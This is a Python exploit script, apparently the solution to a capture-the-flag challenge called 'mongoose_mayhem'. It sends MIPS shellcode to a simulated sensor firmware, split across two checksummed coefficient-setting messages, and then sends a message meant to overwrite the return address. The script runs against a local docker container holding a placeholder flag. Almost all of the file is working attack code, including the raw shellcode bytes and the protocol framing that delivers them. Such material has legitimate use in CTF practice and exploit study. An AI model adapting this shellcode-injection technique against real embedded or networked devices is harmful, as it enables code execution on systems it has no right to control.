#!/bin/python3

import subprocess
import time
import struct
import sys
import threading
import socket
import os

#shellcode = b"\x04\x00\r4\x06\x00\x084\x00\xa2\t<\x00\x80)5\x00\xa3\n<$\x00J5\x00\x00\x0b4\x00\x00\"\x8d\x00\x00\x00\x00\x00\x00B\xad\x04\x00)%\x04\x00J%\x01\x00k%\xf9\xffm\x15\x00\x00\x00\x00\x00\xa3\x0c< \x00\x8c5\x00\x00\x88\xa1\x00\x00\x8e\x81\x00\x00\x00\x00\x00\x00\x00\x00\xfc\xff\xc0\x1d\x00\x00\x00\x00\xff\xff\x08!\xeb\xff\x00\x15\x00\x00\x00\x00\xff\xff\x00\x10\x00\x00\x00\x00"

#shellcode = b"\x00\x00\x00\x00\x04\x00\r4\x08\x00\x084\x00\xa2\t<\x00\x80)5\x00\xa3\n<$\x00J5\x00\x00\x0b4\x00\x00\x00\x00\x00\x00\"\x8d\x00\x00\x00\x00\x00\x00B\xad\x04\x00)%\x04\x00J%\x01\x00k%\xf8\xffm\x15\x00\x00\x00\x00\x00\xa3\x0c< \x00\x8c5\x00\x00\x88\xa1\x00\x00\x8e\x81\x00\x00\x00\x00\xfd\xff\xc0\x1d\x00\x00\x00\x00\xff\xff\x08!\xeb\xff\x00\x15\x00\x00\x00\x00\xff\xff\x00\x10"

#shellcode = b"\x00\x00\x00\x00\x04\x00\r4\x08\x00\x084\x00\xa2\t<\x00\x80)5\x00\xa3\n<$\x00J5\x00\x00\x0b4\x00\x00\"\x8d\x00\x00\x00\x00\x00\x00B\xad\x04\x00)%\x04\x00J%\x01\x00k%\x00\x00\x00\x00\xf8\xffm\x15\x00\x00\x00\x00\x00\xa3\x0c< \x00\x8c5\x00\x00\x88\xa1\x00\x00\x8e\x81\x00\x00\x00\x00\xfd\xff\xc0\x1d\x00\x00\x00\x00\xff\xff\x08!\xeb\xff\x00\x15\x00\x00\x00\x00\xff\xff\x00\x10"

shellcode = b"\x00\x00\x00\x00\x04\x00\r4\x08\x00\x084\x00\xa2\t<\x00\x80)5\x00\xa3\n<$\x00J5\x00\x00\x0b4\x00\x00\"\x8d\x00\x00\x00\x00\x00\x00B\xad\x04\x00)%\x04\x00J%\x01\x00k%\xf9\xffm\x15\x00\x00\x00\x00\x00\xa3\x0c< \x00\x8c5\x00\x00\x88\xa1\x00\x00\x00\x00\x00\x00\x8e\x81\x00\x00\x00\x00\xfc\xff\xc0\x1d\x00\x00\x00\x00\xff\xff\x08!\xeb\xff\x00\x15\x00\x00\x00\x00\xff\xff\x00\x10"

shellcode_part1 = shellcode[0:56]
shellcode_part2 = shellcode[56:]

print(len(shellcode))

print(len(shellcode_part2))

shellcode_part2 += b'\x00' * (56-len(shellcode_part2))

ENABLE_SENSOR = 0x10
DISABLE_SENSOR = 0x20
SET_COEFFICIENTS1 = 0x30
SET_COEFFICIENTS2 = 0x31
SET_BIAS = 0x40
SET_TWO_POINTS = 0x58
UPDATE_FILTERS = 0x60


def receive_output(fsock):

    while True:
        data =fsock.stdout.read(16)

        if len(data) == 0:
            break
        #sys.stderr.write("received {} bytes of data\n".format(len(data)))
        print(data,file=sys.stderr)
        sys.stderr.flush()

def do_checksum(message):

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)
    message[60] = checksum & 0xff

    return message
    

def send_coefficients(channel, messageType, coefficients):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = messageType
    message[3] = 56

    message[4:60] = coefficients

    message = do_checksum(message)

    # message[4:12] = struct.pack("d", 5.4319)
    # message[12:20] = struct.pack("d", 1.0187)
    # message[20:28] = struct.pack("d", 3.0187)
    # message[28:36] = struct.pack("d", 2.0187)
    # message[36:44] = struct.pack("d", 10.8769)
    # message[44:52] = struct.pack("d", 0.3187)
    # message[52:60] = struct.pack("d", 10.99187)

    channel.stdin.write(message)


def send_bias(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = SET_BIAS
    message[3] = 8

    message[4:12] = struct.pack("d", 2.4319)

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)
    message[60] = checksum & 0xff
    channel.stdin.write(message)

def send_two_points(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = SET_TWO_POINTS
    message[3] = 8

    message[4:12] = struct.pack("2I", 0xa0180590, 0xa0180590)
    
    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)
    message[60] = checksum & 0xff
    channel.stdin.write(message)


def send_enable(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = ENABLE_SENSOR
    message[3] = 0

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)
    message[60] = checksum & 0xff
    channel.stdin.write(message)

def send_update(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = UPDATE_FILTERS
    message[3] = 0

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)
    message[60] = checksum & 0xff
    channel.stdin.write(message)

def send_disable(channel):

    message = bytearray(b'\x00'*64)
    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = DISABLE_SENSOR
    message[3] = 0

    message = do_checksum(message)

    channel.stdin.write(message)

def send_test(channel):

    message = bytearray(b'\x00'*64)

    message[0] = 0xa5
    message[1] = 0x5a

    message[2:54] = b'zABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy'

    # message[3] = 0

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)

    message[63] = checksum & 0xff
    channel.stdin.write(message)

def send_buffer(channel):

    message = bytearray(b'\x00'*64)

    message[0] = 0xa5
    message[1] = 0x5a

    message[2] = 0x70
    message[3] = 0x00

    message[4:20] = struct.pack("4I", 0xa01805a0, 0xa01805a0,0xa01805a0,0xa01805a0 )

    checksum = 0

    for i in range(0, 58):
        checksum += message[i+2]

    checksum = 0xff - (checksum & 0xff)

    message[63] = checksum & 0xff
    channel.stdin.write(message)


def main():

    #if 'CHAL_HOST' in os.environ and 'CHAL_PORT' in os.environ:
    #    host = os.environ.get('CHAL_HOST')
    #    port = os.environ.get('CHAL_PORT')
    #    ticket = os.environ.get('TICKET', "")
    #else:
    #    print('[ERROR] CHAL_HOST and CHAL_PORT environment variables are required')
    #    exit(-1)
    
    #Get the host:port from LCM 
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # sock.connect((host, int(port)))
    # fsock = sock.makefile('rw')
    # if len(ticket):
    #     line =  fsock.readline()
    #     fsock.write(ticket + '\n')
    #     fsock.flush()

    child = subprocess.Popen(['docker', 'run', '--rm', '-i', '-e','FLAG=flag{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345678901234567890}','mongoose_mayhem:challenge'],0, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    # child = subprocess.Popen(['./vmips', '-o', 'fpu', '-o', 'memsize=3000000','a.out.rom'], 0, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    time.sleep(1)

    th = threading.Thread(target=receive_output, args=(child,), daemon=True)

    th.start()

    time.sleep(3)

    sys.stderr.write("disabling sensor readout\n")
    send_disable(child)

    time.sleep(3)

    sys.stderr.write("sending shellcode1 in coefficients1\n")

    send_coefficients(child, SET_COEFFICIENTS1, shellcode_part1)

    time.sleep(1)

    sys.stderr.write("sending shellcode2 in coefficients2\n")

    send_coefficients(child, SET_COEFFICIENTS2, shellcode_part2)

    time.sleep(1)

    sys.stderr.write("sending RA overwrite\n")

    # send_buffer(child)

    send_two_points(child)

    time.sleep(10)


if __name__ == "__main__":
    main()
